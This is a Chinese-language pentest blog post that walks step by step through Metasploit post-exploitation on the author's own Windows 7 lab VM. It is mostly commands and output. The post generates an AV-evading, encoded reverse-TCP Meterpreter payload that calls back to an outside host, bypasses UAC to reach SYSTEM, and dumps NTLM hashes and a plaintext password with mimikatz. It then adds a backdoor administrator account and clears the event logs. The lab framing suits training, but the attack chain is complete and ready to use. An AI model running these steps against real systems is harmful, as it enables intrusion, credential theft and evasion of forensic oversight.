---
draft: false
date: 2018-02-26 13:43:20
title: Metasploit 简单提权
description: 本地构建渗透测试环境，在已经获得 shell 的前提下尝试利用 Metasploit 进行提权
categories:
  - Pentest
tags:
  - tools
  - intranet
---

### 0x00 前提
虚拟机有一个shell：```http://10.11.11.20/a.php```，物理机IP是211.222.222.72   
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195

### 0x01 查看主机基本信息
菜刀连接shell，终端执行systeminfo
```
C:\Apps\phpStudy\WWW\> systeminfo

主机名:           REBER-WIN7
OS 名称:          Microsoft Windows 7 专业版
OS 版本:          6.1.7600 ��ȱ Build 7600
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:       Multiprocessor Free
注册的所有人:      reber
注册的组织:       
产品 ID:          00371-868-0000007-85272
初始安装日期:      2017/12/26, 7:23:00
系统启动时间:      2018/2/26, 9:52:14
系统制造商:        Parallels Software International Inc.
系统型号:          Parallels Virtual Platform
系统类型:          x64-based PC
处理器:           安装了 1 个处理器。
                 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz
BIOS 版本:        Parallels Software International Inc. 12.0.2 (41353), 2016/9/15
Windows 目录:     C:\Windows
系统目录:          C:\Windows\system32
启动设备:          \Device\HarddiskVolume1
系统区域设置:      zh-cn;中文(中国)
输入法区域设置:    zh-cn;中文(中国)
时区:             (GMT+08:00) 北京
物理内存总量:      4,096 MB
可用的物理内存:    2,897 MB
页面文件: 最大值:  8,189 MB
页面文件: 可用:    6,794 MB
页面文件: 使用中:  1,395 MB
页面文件位置:      C:\pagefile.sys
域:              REBER
登录服务器:       \\REBER-WIN7
修补程序:         安装了 1 个修补程序。
                  [01]: KB958488
网卡:            安装了 1 个 NIC。
                  [01]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接 3
                      启用 DHCP:   是
                      DHCP 服务器: 10.11.11.1
                      IP 地址
                        [01]: 10.11.11.20
                        [02]: fe80::d509:b75f:4cc5:5628
```

### 0x02 弹出会话到Metasploit
生成payload，然后用菜刀上传到目标服务器
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=114.115.123.123 LPORT=8888 -a x86 -e x86/shikata_ga_nai -i 5 --platform windows -f exe -o 86.exe
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai succeeded with size 441 (iteration=3)
x86/shikata_ga_nai succeeded with size 468 (iteration=4)
x86/shikata_ga_nai chosen with final size 468
Payload size: 468 bytes
Final size of exe file: 73802 bytes
Saved as: 86.exe

# -p 指定payload(用msfvenom -l payloads可查看所有payload)
# -a 指定目标指令集架构
# -e 指定用什么编码器编码(多次编码变幻可以免杀，用msfvenom -l encoders可查看编码类型)
# -i 指定编码迭代的次数
# --platform 执行目标的平台
# -f 指定输出格式，可用msfvenom --help-formats查看
```
msf监听，等待payload执行
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(multi/handler) > set LPORT 8888
LPORT => 8888
# autorunscript: 目标上线后执行命令将进程迁移到了资源管理器，防止用户删除木马，然后丢失目标的情况
msf exploit(multi/handler) > set autorunscript migrate -n explorer.exe
autorunscript => migrate -n explorer.exe
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address
   LPORT     8888             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
msf exploit(multi/handler) >
[*] Started reverse TCP handler on 0.0.0.0:8888

msf exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:8888

msf exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf exploit(multi/handler) >
```
通过菜刀执行上传的aa.exe，菜刀显示执行错误，但是msf已经成功与目标建立了一个会话
```
msf exploit(multi/handler) >
[*] Sending stage (179779 bytes) to 211.222.222.72
[*] Meterpreter session 1 opened (192.168.0.195:8888 -> 211.222.222.72:34576) at 2018-02-26 12:26:32 +0800

msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  REBER-WIN7\reber @ REBER-WIN7  192.168.0.195:8888 -> 211.222.222.72:34576 (10.11.11.20)

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ls
Listing: C:\Users\reber\Desktop
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  73802   fil   2018-02-26 12:02:38 +0800  aa.exe
100666/rw-rw-rw-  282     fil   2017-12-25 15:24:08 +0800  desktop.ini
100666/rw-rw-rw-  9029    fil   2018-02-07 00:14:51 +0800  ftptrace.txt
100666/rw-rw-rw-  108     fil   2018-02-06 23:55:17 +0800  users.dat
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) >
```

### 0x03 提权
前面通过systeminfo得知为Win7主机，只有一个补丁，直接尝试绕过UAC进行提权
```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac
msf exploit(windows/local/bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypassuac) > options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(windows/local/bypassuac) > set session 1
session => 1
msf exploit(windows/local/bypassuac) > set LHOST 114.115.123.123
LHOST => 114.115.123.123
msf exploit(windows/local/bypassuac) > set LPORT 6666
LPORT => 6666
msf exploit(windows/local/bypassuac) > options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION    1                yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     114.115.123.123   yes       The listen address
   LPORT     6666             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(windows/local/bypassuac) > run

[-] Handler failed to bind to 114.115.123.123:6666:-  -
[*] Started reverse TCP handler on 0.0.0.0:6666
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (179779 bytes) to 211.222.222.72
[*] Meterpreter session 2 opened (192.168.0.195:6666 -> 211.222.222.72:39027) at 2018-02-26 16:29:34 +0800

meterpreter > getuid
Server username: REBER-WIN7\reber
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### 0x04 获得用户名密码
```
meterpreter > load mimikatz
Loading extension mimikatz...Success.
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain        User           Password
------   -------    ------        ----           --------
0;69053  NTLM       REBER-WIN7    reber          lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
0;69036  NTLM       REBER-WIN7    reber          lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
0;996    Negotiate  REBER         REBER-WIN7$    n.s. (Credentials KO)
0;27026  NTLM                                    n.s. (Credentials KO)
0;999    NTLM       REBER         REBER-WIN7$    n.s. (Credentials KO)

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain        User           Password
------   -------    ------        ----           --------
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE
0;996    Negotiate  REBER         REBER-WIN7$
0;27026  NTLM
0;999    NTLM       REBER         REBER-WIN7$
0;69053  NTLM       REBER-WIN7    reber          123456
0;69036  NTLM       REBER-WIN7    reber          123456

meterpreter >
```

### 0x05 添加用户
```
meterpreter > shell
Process 2020 created.
Channel 1 created.
Microsoft Windows [▒汾 6.1.7600]
▒▒Ȩ▒▒▒▒ (c) 2009 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒

C:\Windows\system32>net user hacker 123456 /add
net user hacker 123456 /add
▒▒▒▒ɹ▒▒▒ɡ▒


C:\Windows\system32>net localgroup administrators hacker /add
net localgroup administrators hacker /add
▒▒▒▒ɹ▒▒▒ɡ▒
```

### 0x06 清理痕迹
```
meterpreter > clearev
```